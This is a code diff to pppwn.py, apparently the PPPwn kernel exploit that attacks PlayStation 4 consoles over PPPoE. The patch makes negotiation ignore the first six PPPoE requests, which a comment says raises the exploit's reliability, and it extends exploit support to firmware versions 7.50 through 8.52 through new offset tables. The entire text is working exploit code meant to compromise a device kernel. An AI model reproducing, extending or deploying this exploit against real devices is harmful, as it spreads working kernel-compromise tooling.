@@ -259,10 +259,17 @@ class Exploit():
                              id=pkt[PPP_IPCP].id,
                              options=pkt[PPP_IPCP].options))
 
-    def ppp_negotation(self, cb=None):
+    def ppp_negotation(self, cb=None, ignore_initial_reqs=False):
+        num_reqs_to_ignore = 6  # Ignore initial requests in order to increase the chances of the exploit to work
+                                # Tested from 6 to 8 requests, on version 10.50 - all give best results then not ignoring
+        num_ignored_reqs = 0
         print('[*] Waiting for PADI...')
         while True:
             pkt = self.s.recv()
+            if ignore_initial_reqs and (num_ignored_reqs < num_reqs_to_ignore):
+                print('[*] Ignoring initial PS4 PPoE request #{}..'.format(num_ignored_reqs+1))
+                num_ignored_reqs+=1
+                continue
             if pkt and pkt.haslayer(
                     PPPoED) and pkt[PPPoED].code == PPPOE_CODE_PADI:
                 break
@@ -654,7 +661,7 @@ class Exploit():
         print('')
         print('[+] STAGE 0: Initialization')
 
-        self.ppp_negotation(self.build_fake_ifnet)
+        self.ppp_negotation(self.build_fake_ifnet, True)
         self.lcp_negotiation()
         self.ipcp_negotiation()
 
@@ -865,7 +872,16 @@ class Exploit():
 def main():
     parser = ArgumentParser('pppwn.py')
     parser.add_argument('--interface', required=True)
-    parser.add_argument('--fw', choices=['672', '900', '903', '904', '950', '960', '1000', '1001', '1050','1070','1071', '1100'], default='1100')
+    parser.add_argument('--fw',
+                        choices=[
+                            '672',
+                            '750', '751', '755',
+                            '800', '801', '803', '850', '852',
+                            '900', '903', '904', '950', '951', '960',
+                            '1000', '1001', '1050', '1070', '1071',
+                            '1100'
+                        ],
+                        default='1100')
     parser.add_argument('--stage1', default='stage1/stage1.bin')
     parser.add_argument('--stage2', default='stage2/stage2.bin')
     args = parser.parse_args()
@@ -881,6 +897,12 @@ def main():
 
     if args.fw == '672':
         offs = OffsetsFirmware_672()
+    elif args.fw in ('750', '751', '755'):
+        offs = OffsetsFirmware_750_755()
+    elif args.fw in ('800', '801', '803'):
+        offs = OffsetsFirmware_800_803()
+    elif args.fw in ('850', '852'):
+        offs = OffsetsFirmware_850_852()
     elif args.fw == '900':
         offs = OffsetsFirmware_900()
     elif args.fw in ('903', '904'):
